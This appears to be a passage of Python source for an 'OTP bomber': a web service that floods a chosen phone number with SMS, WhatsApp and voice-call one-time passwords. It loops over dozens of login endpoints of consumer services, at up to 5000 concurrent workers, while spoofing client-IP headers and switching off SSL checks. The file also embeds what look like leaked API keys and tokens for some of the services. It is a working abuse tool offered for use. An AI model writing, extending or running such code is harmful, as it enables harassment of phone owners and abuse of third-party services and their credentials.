    {"name": "gokwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-version": "20250421065835697", "gk-signature": "076108", "gk-udf-1": "951", "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761", "gk-merchant-id": "19g6jlc658iad", "Origin": "https://pdp.gokwik.co"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
    {"name": "jockey_wa", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "okhttp/3.9.1"}, "data": None},
    {"name": "rappi_mx", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"}, "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},
    {"name": "foxy_wa", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.9.3", "Device-Id": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},
    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},

    # ══════════════ BULK APIs ══════════════
    {"name": "1mg_1", "url": "https://1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":true}}'},
    {"name": "ajio_1", "url": "https://ajio.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "amazon_1", "url": "https://amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "bigbasket_1", "url": "https://bigbasket.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "blinkit_1", "url": "https://blinkit.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "cred_1", "url": "https://cred.club/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "doubtnut_1", "url": "https://doubtnut.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "flipkart_1", "url": "https://flipkart.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "goibibo_1", "url": "https://goibibo.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "khatabook_1", "url": "https://khatabook.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "meesho_1", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "myntra_1", "url": "https://myntra.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "nykaa_1", "url": "https://nykaa.com/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "olacabs_1", "url": "https://olacabs.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "oyorooms_1", "url": "https://oyorooms.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "paytm_1", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "pharmeasy_1", "url": "https://pharmeasy.in/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "phonepe_1", "url": "https://phonepe.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "pokerbaazi_1", "url": "https://pokerbaazi.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "rapido_1", "url": "https://rapido.bike/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "shiprocket_2", "url": "https://shiprocket.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "swiggy_1", "url": "https://swiggy.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "tatacapital_1", "url": "https://tatacapital.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "uber_1", "url": "https://uber.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "wakefit_2", "url": "https://wakefit.co/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "zepto_1", "url": "https://zepto.com/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "zivame_1", "url": "https://zivame.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "zomato_1", "url": "https://zomato.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
]

print(f"✅ Loaded {len(ULTIMATE_APIS)} APIs")


# ═══════════════════════════════════════════════════════════
# 💣 FIRE ONE
# ═══════════════════════════════════════════════════════════
async def fire_one(session, api, phone, stats):
    try:
        headers = dict(api["headers"])
        headers["X-Forwarded-For"] = "103.159.84.134"
        headers["Client-IP"] = "103.159.84.134"

        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None

        method = api["method"].upper()
        if method == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try: text = await r.text()
                except: text = ""

        stats["total"] += 1
        if status < 400:
            stats["http_ok"] += 1
            low = text[:300].lower()
            if any(k in low for k in OTP_KEYWORDS):
                stats["otp_ok"] += 1
        else:
            stats["failed"] += 1
    except Exception:
        stats["total"] += 1
        stats["failed"] += 1


# ═══════════════════════════════════════════════════════════
# 💣 WORKER — 5000 CONCURRENT
# ═══════════════════════════════════════════════════════════
async def bomb_worker(job_id: str, phone: str, count: int):
    _stop_numbers.discard(phone)

    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT, limit_per_host=200,
        ttl_dns_cache=300, force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers_base = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}

    stats = _global_stats[phone]
    stats["total"] = stats["http_ok"] = stats["otp_ok"] = stats["failed"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"[{job_id}] 🔥 SUPER FLASH BOMB | +91{phone} | count={count}")
    print(f"[{job_id}] {len(ULTIMATE_APIS)} APIs | workers={MAX_CONCURRENT}")
    print(f"{'='*70}")

    try:
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers_base
        ) as session:
            for cycle in range(count):
                if phone in _stop_numbers:
                    print(f"[{job_id}] 🛑 Stopped at cycle {cycle+1}")
                    break
                tasks = [fire_one(session, api, phone, stats) for api in ULTIMATE_APIS]
                await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0
                print(f"[{job_id}] Cycle {cycle+1}/{count} | Total={stats['total']} | "
                      f"HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | {rps:.1f}/s")
                await asyncio.sleep(0.05)
    except Exception as e:
        print(f"[{job_id}] ❌ {e}")
    finally:
        _running_jobs.pop(job_id, None)
        print(f"[{job_id}] ✅ DONE | Total={stats['total']} | "
              f"HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | Failed={stats['failed']}")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""
    <html><head><title>ULTIMATE OTP BOMBER v5.0</title></head>
    <body style="font-family:monospace;background:#111;color:#0f0;padding:20px">
    <h1>🔥 ULTIMATE OTP BOMBER API v5.0</h1>
    <p>Status: <b>ONLINE</b></p>
    <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>5000</b></p>
    <h3>Endpoints:</h3>
    <ul>
      <li><a href="/health" style="color:#0ff">/health</a></li>
      <li><a href="/apis" style="color:#0ff">/apis</a></li>
      <li><a href="/send?number=9876543210&count=10" style="color:#0ff">/send?number=9876543210&count=10</a></li>
      <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
      <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
    </ul>
    </body></html>
    """


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "total_apis": len(ULTIMATE_APIS),
        "max_workers": MAX_CONCURRENT,
        "time": datetime.now().isoformat(),
    }


@app.get("/apis")
async def list_apis():
    return {"total": len(ULTIMATE_APIS), "apis": [a["name"] for a in ULTIMATE_APIS]}


@app.get("/send")
async def send_endpoint(
    bg: BackgroundTasks,
    number: str = Query(..., description="10 digit phone"),
    count: int = Query(1, description="cycles"),
):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")

    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
    if count <= 0 or count > 10000:
        return JSONResponse({"success": False, "error": "count must be 1-10000"}, 400)

    job_id = str(uuid4())[:8]
    _running_jobs[job_id] = {"number": number, "count": count}
    bg.add_task(bomb_worker, job_id, number, count)

    return {
        "success": True,
        "job_id": job_id,
        "target": f"+91{number}",
        "count": count,
        "apis": len(ULTIMATE_APIS),
        "total_requests": count * len(ULTIMATE_APIS),
        "workers": MAX_CONCURRENT,
        "stop_url": f"/stop?number={number}",
        "stats_url": f"/stats?number={number}",
    }


@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _stop_numbers.add(number)
    killed = [jid for jid, job in list(_running_jobs.items()) if job["number"] == number]
    return {"success": True, "message": f"🛑 Stop for +91{number}", "killed_jobs": killed}


@app.get("/stats")
async def stats_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    s = _global_stats.get(number, {})
    if not s:
        return {"success": False, "error": "no stats"}
    elapsed = time.time() - s.get("start", time.time())
    rps = s["total"] / elapsed if elapsed else 0
    return {
        "success": True, "number": f"+91{number}",
        "total": s.get("total", 0), "http_ok": s.get("http_ok", 0),
        "otp_ok": s.get("otp_ok", 0), "failed": s.get("failed", 0),
        "elapsed": round(elapsed, 2), "rps": round(rps, 1),
    }


# ═══════════════════════════════════════════════════════════
# 🚀 RUN (Local)
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v5.0 — ALL-IN-ONE          ║
║   ▸ APIs loaded   : {len(ULTIMATE_APIS)}
║   ▸ Max workers   : {MAX_CONCURRENT}
║   ▸ Server        : http://0.0.0.0:5000
║   ▸ Test          : http://localhost:5000/send?number=9876543210&count=100
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
